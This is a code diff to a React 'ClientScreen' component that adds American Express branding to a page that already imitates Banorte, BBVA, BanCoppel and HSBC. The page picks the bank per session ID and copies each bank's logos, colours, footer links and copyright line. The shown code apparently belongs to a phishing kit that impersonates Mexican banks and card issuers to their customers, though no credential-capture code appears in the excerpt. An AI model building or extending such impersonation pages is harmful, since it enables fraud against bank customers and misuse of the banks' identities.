@@ -15,6 +15,7 @@ import bancoppelLogo from '@assets/bancoppel.png';
 import banorteLogoFooter from '@assets/Banorte-01.png';
 import hsbcLogo from '@assets/Hsbc.png';
 import hsbcBackground from '@assets/IMG_0391.jpeg';
+import amexLogo from '@assets/Amex.png';
 
 export default function ClientScreen() {
   // Get session ID from URL
@@ -177,6 +178,17 @@ export default function ClientScreen() {
           />
         </header>
       );
+    } else if (sessionData.banco === 'AMEX') {
+      return (
+        <header className="bg-[#0077C8] text-white p-4 text-center">
+          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
+          <img 
+            src={amexLogo} 
+            className="h-20 inline-block" 
+            alt="American Express" 
+          />
+        </header>
+      );
     } else {
       // Default header (Banorte)
       return (
@@ -220,6 +232,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
               sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
               sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
+              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
               'text-[#EC1C24]'
             } mx-2`}>Aprende más</a>
             <a href="#" className={`${
@@ -227,6 +240,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
               sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
               sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
+              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
               'text-[#EC1C24]'
             } mx-2`}>Ayuda</a>
             <a href="#" className={`${
@@ -234,6 +248,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
               sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
               sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
+              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
               'text-[#EC1C24]'
             } mx-2`}>Términos y condiciones</a>
             <a href="#" className={`${
@@ -241,6 +256,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BBVA' ? 'text-[#072146]' :
               sessionData.banco === 'BANCOPPEL' ? 'text-[#0066B3]' :
               sessionData.banco === 'HSBC' ? 'text-[#DB0011]' :
+              sessionData.banco === 'AMEX' ? 'text-[#0077C8]' :
               'text-[#EC1C24]'
             } mx-2`}>Seguridad en línea</a>
           </div>
@@ -250,6 +266,7 @@ export default function ClientScreen() {
             sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
             sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
             sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :
+            sessionData.banco === 'AMEX' ? 'bg-[#0077C8]' :
             'bg-[#EC1C24]'
           } text-white p-4 text-center text-sm`}>
             <div className="mb-3">
@@ -264,6 +281,7 @@ export default function ClientScreen() {
               sessionData.banco === 'BBVA' ? 'BBVA' :
               sessionData.banco === 'BANCOPPEL' ? 'BanCoppel' :
               sessionData.banco === 'HSBC' ? 'HSBC' :
+              sessionData.banco === 'AMEX' ? 'American Express' :
               'Banorte'
             } México 2024. Todos los Derechos Reservados</div>
           </div>
@@ -304,6 +322,12 @@ export default function ClientScreen() {
       return (
         <div className="text-center mt-2 px-4">
           <p className="text-sm text-gray-600 mt-1">El banco local con perspectiva global</p>
+        </div>
+      );
+    } else if (sessionData.banco === 'AMEX') {
+      return (
+        <div className="text-center mt-2 px-4">
+          <p className="text-sm text-gray-600 mt-1">Bienvenido a American Express</p>
         </div>
       );
     } else {
